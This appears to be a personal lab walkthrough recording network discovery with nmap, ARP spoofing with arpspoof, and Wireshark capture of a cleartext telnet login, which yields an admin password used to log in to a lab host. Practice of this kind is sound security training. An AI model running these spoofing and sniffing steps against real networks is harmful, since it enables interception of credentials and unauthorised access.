[[ip]]

```
┌──(rootkali)-[~]
└─# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: adlab0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:f9:76:b6 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.3/24 brd 192.168.0.255 scope global adlab0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fef9:76b6/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:d4:ee:5d brd ff:ff:ff:ff:ff:ff
    inet 10.100.13.140/24 brd 10.100.13.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fed4:ee5d/64 scope link 
       valid_lft forever preferred_lft forever
```

[[Hack2.0/NMAP#General Scan|NMAP]]

```
┌──(rootkali)-[~]
└─# nmap 10.100.13.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-25 17:13 EDT
Nmap scan report for 10.100.13.1
Host is up (0.00020s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server
MAC Address: 0A:00:27:00:00:01 (Unknown)

Nmap scan report for 10.100.13.36
Host is up (0.00034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
23/tcp open  telnet
MAC Address: 08:00:27:4A:45:F3 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.100.13.37
Host is up (0.00039s latency).
All 1000 scanned ports on 10.100.13.37 are closed
MAC Address: 08:00:27:99:AA:A7 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.100.13.140
Host is up (0.0000040s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
5910/tcp open  cm

Nmap done: 256 IP addresses (4 hosts up) scanned in 31.07 seconds
```

Launch the wireshark and select the interface eth1 and see if there is any data traffic. I do not see any data traffic so moving on. Let us ping one of the device and see if we can capture the data traffic on wireshark.

```
┌──(rootkali)-[~]
└─# ping -c 5 10.100.13.37
PING 10.100.13.37 (10.100.13.37) 56(84) bytes of data.
64 bytes from 10.100.13.37: icmp_seq=1 ttl=64 time=3.69 ms
64 bytes from 10.100.13.37: icmp_seq=2 ttl=64 time=0.747 ms
64 bytes from 10.100.13.37: icmp_seq=3 ttl=64 time=1.23 ms
64 bytes from 10.100.13.37: icmp_seq=4 ttl=64 time=0.688 ms
64 bytes from 10.100.13.37: icmp_seq=5 ttl=64 time=0.538 ms

--- 10.100.13.37 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4048ms
rtt min/avg/max/mdev = 0.538/1.377/3.686/1.177 ms
```

Now that we are able to see the data packets. Let us try to do some arp poisoning and try to capture the data traffic that is not meant for us.

configuring the kali instance to forward the ip packets.

```
┌──(rootkali)-[~]
└─# echo 1 > /proc/sys/net/ipv4/ip_forward
```

In this arpspoofing we are trying to imposter as 10.100.13.37 and capture the data between the server and target device.

```
┌──(rootkali)-[~]
└─# arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
```

Once we get the telnet protocol in the wireshark we can either stop or follow the TCP stream. I did select the follow TCP stream and was able to get the password for admin.

```
........... ..!.."..'........ ..#..'........!..".....#........... .....'........... .38400,38400....'.......UNKNOWN..............Ubuntu 20.04 LTS
ine login: admin
.
admin

Password: MyS3cr3tP455
.

Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-28-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Nov 2021 07:54:37 PM UTC

  System load:    0.0                Processes:               101
  Usage of /home: 0.0% of 249.01GB   Users logged in:         0
  Memory usage:   40%                IPv4 address for enp0s3: 10.100.13.36
  Swap usage:     0%


264 updates can be installed immediately.
136 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Thu Nov 18 19:53:57 UTC 2021 on pts/0
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

```

now that we got the password let us go ahead and try to login as admin to telnet

```
┌──(rootkali)-[~]
└─# telnet 10.100.13.36
Trying 10.100.13.36...
Connected to 10.100.13.36.
Escape character is '^]'.
Ubuntu 20.04 LTS
ine login: admin
Password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-28-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Nov 2021 08:00:10 PM UTC

  System load:    0.0                Processes:               102
  Usage of /home: 0.0% of 249.01GB   Users logged in:         0
  Memory usage:   40%                IPv4 address for enp0s3: 10.100.13.36
  Swap usage:     0%


264 updates can be installed immediately.
136 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Thu Nov 18 19:59:57 UTC 2021 on pts/1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@ine:~$ 

```